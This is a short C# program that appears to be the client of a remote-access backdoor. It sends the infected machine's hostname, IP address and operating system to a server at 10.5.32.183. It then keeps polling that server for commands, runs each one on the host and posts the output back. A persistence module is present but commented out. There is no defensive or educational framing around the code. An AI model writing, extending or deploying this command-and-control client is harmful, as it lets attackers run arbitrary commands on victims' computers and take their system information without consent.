using System;

namespace client_software
{
    class Program{
        static void Main(string[] args){
           
            GeneralInfo info=new GeneralInfo();
           
            //Persistance pers=new Persistance(info);
            Operations opts=new Operations(info);


            string commandURL="http://10.5.32.183/getcommand.php";
            string registerURL="http://10.5.32.183/register.php";
            string getresultURL="http://10.5.32.183/getresults.php";

            System.Net.WebClient webObj=new System.Net.WebClient();
            int exceptionCounter=0;
            Console.WriteLine("1");
            string registerParams="hostname="+info.hostName.ToString()+"&ip="+info.ipv4.ToString()+"&operatingsystem="+info.osInfo.ToString();   //"hostname="+info.hostName+"$ip="+info.ipv4+"&operatingsystem="+info.osInfo;
            Console.WriteLine(registerParams);
            webObj.Headers.Add("Content-Type","application/x-www-form-urlencoded");
            Console.WriteLine("2");
            webObj.UploadString(registerURL,"POST", registerParams);
            Console.WriteLine("3");
            while (true)
            {
                if(exceptionCounter>15){
                    break;
                }
                try{
                    webObj.Headers.Add("Content-Type","application/x-www-form-urlencoded");
                    string takenCommand=webObj.UploadString(commandURL,"POST", registerParams);
                    if(takenCommand.Length>1){
                        string commandResult=opts.ExecuteCMD(takenCommand);
                        string resultParams="hostname="+info.hostName.ToString()+"&ip="+info.ipv4.ToString()+"&result="+commandResult.ToString();  
                        webObj.Headers.Add("Content-Type","application/x-www-form-urlencoded");
                        webObj.UploadString(getresultURL,"POST", resultParams);
                    }
                    
                    System.Threading.Thread.Sleep(5000);
                    exceptionCounter=0;
                }
                catch{
                    System.Threading.Thread.Sleep(5000);
                    exceptionCounter+=1;
                }
            }

            
        }
    }
}
